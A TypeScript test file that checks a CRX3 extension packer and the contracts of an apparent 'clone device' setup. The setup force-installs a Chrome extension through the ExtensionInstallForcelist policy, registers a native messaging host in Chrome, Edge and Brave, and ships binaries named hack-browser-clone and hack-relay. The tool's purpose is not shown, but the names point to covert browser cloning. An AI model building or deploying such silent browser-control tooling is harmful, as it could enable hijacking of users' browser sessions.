/**
 * TASK_214 — one-click clone-device setup, force-install layer (D6) + the
 * D1–D5 contracts it must not break.
 *
 * The centrepiece is BEHAVIOURAL: we pack a CRX3 with an ephemeral key and
 * then independently verify it the way Chromium does — parse the protobuf
 * header by hand, re-derive crx_id from the SPKI, re-verify the RSA-SHA256
 * signature over "CRX3 SignedData\0" + varint + SignedData, re-derive the
 * a..p extension id. Generating a key IN THE TEST is deliberate and does not
 * violate the build's no-generation guardrail: the test key exists only for
 * the duration of the test; the shipped build (scripts/engine-dist.mjs)
 * consumes the owner's persistent .pem and aborts loudly without it.
 */
import assert from "node:assert/strict";
import { createHash, createPublicKey, generateKeyPairSync, verify } from "node:crypto";
import { readFileSync } from "node:fs";
import { describe, it } from "node:test";

import { packCrx3, updateManifestJson } from "../scripts/lib/crx3.mjs";

const repoRoot = new URL("..", import.meta.url).pathname;
const read = (p: string) => readFileSync(`${repoRoot}${p}`, "utf8");

function pemPair(): { privateKeyPem: string; publicKey: ReturnType<typeof createPublicKey> } {
  const { privateKey, publicKey } = generateKeyPairSync("rsa", { modulusLength: 2048 });
  return {
    privateKeyPem: privateKey.export({ type: "pkcs8", format: "pem" }).toString(),
    publicKey,
  };
}

/** Minimal protobuf reader for the fixed CrxFileHeader shape we produce. */
function readVarint(buf: Buffer, at: number): [number, number] {
  let n = 0;
  let shift = 0;
  let i = at;
  for (;;) {
    const b = buf[i++]!;
    n |= (b & 0x7f) << shift;
    if ((b & 0x80) === 0) return [n >>> 0, i];
    shift += 7;
  }
}

function parseCrx(crx: Buffer): {
  headerLen: number;
  publicKey: Buffer;
  signature: Buffer;
  zip: Buffer;
} {
  assert.equal(crx.subarray(0, 4).toString("latin1"), "Cr24", "magic");
  assert.equal(crx.readUInt32LE(4), 3, "CRX version");
  const headerLen = crx.readUInt32LE(8);
  const header = crx.subarray(12, 12 + headerLen);
  // CrxFileHeader { 1: AsymmetricKeyProof } { 1: MessageSha256WithRsa } { 1: key, 2: sig }
  let p = 0;
  const field = (tag: number) => {
    assert.equal(header[p]!, tag, `protobuf tag 0x${tag.toString(16)} at ${p}`);
    p += 1;
    const [len, np] = readVarint(header, p);
    p = np;
    return header.subarray(p, p + len);
  };
  const proof = field(0x0a); // CrxFileHeader.sha256_with_rsa[0]
  const msg = (() => {
    let q = 0;
    const inner = (tag: number) => {
      assert.equal(proof[q]!, tag, "AsymmetricKeyProof tag");
      q += 1;
      const [len, nq] = readVarint(proof, q);
      q = nq;
      return proof.subarray(q, q + len);
    };
    return inner(0x0a); // sha256_with_rsa
  })();
  let r = 0;
  const msgField = (tag: number) => {
    assert.equal(msg[r]!, tag, "MessageSha256WithRsa tag");
    r += 1;
    const [len, nr] = readVarint(msg, r);
    r = nr + len; // advance PAST the data — two fields are read back-to-back
    return msg.subarray(nr, nr + len);
  };
  const publicKey = msgField(0x0a);
  const signature = msgField(0x12);
  return { headerLen, publicKey, signature, zip: crx.subarray(12 + headerLen) };
}


describe("TASK_214 crx3 packer — behavioural (Chrome-spec verification)", () => {
  it("packs a CRX3 whose header, signature, crx_id and extension id verify independently", () => {
    const { privateKeyPem, publicKey } = pemPair();
    const zip = Buffer.concat([Buffer.from("PK\x03\x04", "latin1"), Buffer.from("t214-fake-zip-payload")]);
    const { crx, extensionId, crxId } = packCrx3(privateKeyPem, zip);

    const parsed = parseCrx(crx);
    assert.deepEqual(parsed.zip, zip, "zip payload follows the header byte-for-byte");

    const spki = publicKey.export({ type: "spki", format: "der" });
    assert.deepEqual(parsed.publicKey, spki, "embedded SPKI matches the signing key");
    assert.deepEqual(
      crxId,
      createHash("sha256").update(spki).digest().subarray(0, 16),
      "crx_id = sha256(SPKI)[0..16]",
    );
    assert.equal(
      extensionId,
      Buffer.from(crxId)
        .toString("hex")
        .replace(/[0-9a-f]/g, (c) => "abcdefghijklmnop"[parseInt(c, 16)]!),
      "extension id is the a..p encoding of crx_id",
    );
    assert.match(extensionId, /^[a-p]{32}$/, "Chrome extension id alphabet and length");

    const signedData = Buffer.concat([Buffer.from([0x0a, 0x10]), crxId]);
    const sigInput = Buffer.concat([
      Buffer.from("CRX3 SignedData\0", "latin1"),
      Buffer.from([signedData.length]),
      signedData,
    ]);
    assert.equal(
      verify("sha256", sigInput, publicKey, parsed.signature),
      true,
      "RSA-SHA256 signature over CRX3 SignedData verifies",
    );
  });

  it("is deterministic for the same key+payload and id-stable across re-packs", () => {
    const { privateKeyPem } = pemPair();
    const zip = Buffer.from("PK\x03\x04abc");
    const a = packCrx3(privateKeyPem, zip);
    const b = packCrx3(privateKeyPem, zip);
    assert.deepEqual(a.crx, b.crx, "same key + same payload -> identical bytes (id never drifts)");
    assert.equal(a.extensionId, b.extensionId);
  });

  it("different key -> different extension id (why the .pem must be persistent)", () => {
    const zip = Buffer.from("PK\x03\x04abc");
    const one = packCrx3(pemPair().privateKeyPem, zip);
    const two = packCrx3(pemPair().privateKeyPem, zip);
    assert.notEqual(one.extensionId, two.extensionId, "a regenerated key would mint a new id");
  });

  it("refuses non-RSA keys and empty payloads loudly", () => {
    const { privateKey } = generateKeyPairSync("ed25519");
    const edPem = privateKey.export({ type: "pkcs8", format: "pem" }).toString();
    assert.throws(() => packCrx3(edPem, Buffer.from("PK\x03\x04x")), /must be RSA/);
    assert.throws(() => packCrx3(pemPair().privateKeyPem, Buffer.alloc(0)), /non-empty/);
  });

  it("updateManifestJson emits the genc shape the device-side step reads", () => {
    const json = JSON.parse(
      updateManifestJson({
        publicBase: "https://spaceworker.top/",
        extensionId: "a".repeat(32),
        version: "1.0.0",
      }),
    ) as { genc: Record<string, { crx_url: string; version: string }> };
    assert.deepEqual(Object.keys(json.genc), ["a".repeat(32)], "genc key IS the extension id");
    assert.equal(
      json.genc["a".repeat(32)]!.crx_url,
      "https://spaceworker.top/clone-ext/clone-extension.crx",
      "trailing slash stripped; served by the public route",
    );
    assert.equal(json.genc["a".repeat(32)]!.version, "1.0.0");
  });
});

describe("TASK_214 build guardrails — source contract", () => {
  const dist = read("scripts/engine-dist.mjs");
  const setup = read("lib/clone-setup.ts");
  const route = read("app/clone-ext/[file]/route.ts");
  const hook = read("scripts/githooks/pre-commit");
  const ignore = read(".gitignore");

  it("engine-dist packs only on CLONE_EXT_PACK=1 and aborts loudly when the key is missing", () => {
    assert.match(dist, /CLONE_EXT_PACK === "1"/, "packing is opt-in (D1–D5 never blocked)");
    assert.match(dist, /CLONE_EXT_SIGNING_KEY/, "key path is env-overridable");
    assert.match(dist, /restore it, do not regenerate/, "loud abort mandated by the task");
    // call-shaped match: prose may name the API, only a CALL is a violation
    assert.ok(!/generateKeyPair(Sync)?\s*\(/.test(dist), "build never generates a key — a fresh key mints a fresh id");
    assert.ok(!/generateKeyPair(Sync)?\s*\(/.test(read("scripts/lib/crx3.mjs")), "packer never generates a key either");
    assert.match(dist, /clone-extension\.crx/, "writes the crx");
    assert.match(dist, /clone-ext-update\.json/, "writes the update manifest");
  });

  it("engine-dist keeps the D1–D5 artifacts intact", () => {
    for (const name of [
      "hack-browser-clone.exe",
      "hack-browser-clone-svc.exe",
      "hack-relay.exe",
      "clone-native-host.exe",
      "swfwd-linux-amd64",
      "install-relay.ps1",
      "install-hosted.ps1",
      "clone-extension.zip",
    ]) {
      assert.ok(dist.includes(name), `engine-dist still ships ${name}`);
    }
    assert.match(setup, /Get-FileHash -Algorithm SHA256/, "stage script still hash-verifies artifacts");
  });

  it("public route allowlists exactly the two force-list files and holds no session", () => {
    assert.match(route, /"clone-extension\.crx"/, "serves the crx");
    assert.match(route, /"clone-ext-update\.json"/, "serves the update manifest");
    assert.ok(!/"native-host\.exe"/.test(route), "binaries stay on the HMAC route");
    assert.ok(!/"clone-relay\.exe"/.test(route), "binaries stay on the HMAC route");
    assert.ok(!/getSession|requireSession/.test(route), "public by decision: Chrome's updater holds no cookie");
    assert.match(route, /Access-Control-Allow-Origin/, "CRX installs cross-origin by design");
  });

  it("git never accepts the signing key: ignore + pre-commit both refuse", () => {
    assert.match(ignore, /^\*\.pem$/m, ".gitignore covers *.pem");
    assert.match(ignore, /^\*\.crx$/m, ".gitignore covers *.crx");
    assert.match(hook, /exit 1/, "pre-commit blocks the commit");
    assert.match(hook, /pem\|crx/, "pre-commit greps staged names for pem/crx");
  });

  it("device side: forcelist step wired to CLONE_EXT_FORCELIST_URL with the genc id", () => {
    assert.match(setup, /CLONE_EXT_FORCELIST_URL/, "env plumbing");
    assert.match(setup, /extension-forcelist/, "setup step id");
    assert.match(setup, /\$mf\.genc/, "reads the id from the served manifest, never hardcodes it");
    assert.match(setup, /ExtensionInstallForcelist/, "writes the policy value");
    assert.match(setup, /SKIP:not_configured/, "unset URL -> visible SKIP step, never a dangling policy");
    assert.match(setup, /\$extId \+ ';' \+ \$updateUrl/, "forcelist value format <id>;<update url>");
    // The banned persistence is WRITES: `schtasks /Create` and the
    // CloneRegistry run key that Path B's install-registry.ps1 used.
    // (The read-only `schtasks /Query SpaceworkerCloneSrv` presence check for
    // the receiver task — an older, separate feature — is not persistence.)
    assert.ok(!/schtasks \/Create/.test(setup), "no scheduled-task persistence");
    assert.ok(!/"CurrentVersion\\\\+Run/.test(setup), "no Registry run-key persistence");
  });

  it("device side: native host com.spaceworker.clone registered for all three browsers", () => {
    assert.match(setup, /\$hostName = 'com\.spaceworker\.clone'/, "single host name, matching the presence check");
    assert.match(setup, /com\.spaceworker\.clone\.json/, "writes the native-host manifest beside the exe");
    assert.match(setup, /clone-native-host\.exe/, "host exe from the engine build");
    assert.match(setup, /Google\\\\Chrome\\\\NativeMessagingHosts/, "Chrome root");
    assert.match(setup, /Microsoft\\\\Edge\\\\NativeMessagingHosts/, "Edge root");
    assert.match(setup, /BraveSoftware\\\\Brave-Browser\\\\NativeMessagingHosts/, "Brave root");
    assert.match(setup, /ProgramData\\\\TacticalRMM\\\\CloneTool/, "INSTALL_DIR is the real install dir");
  });
});

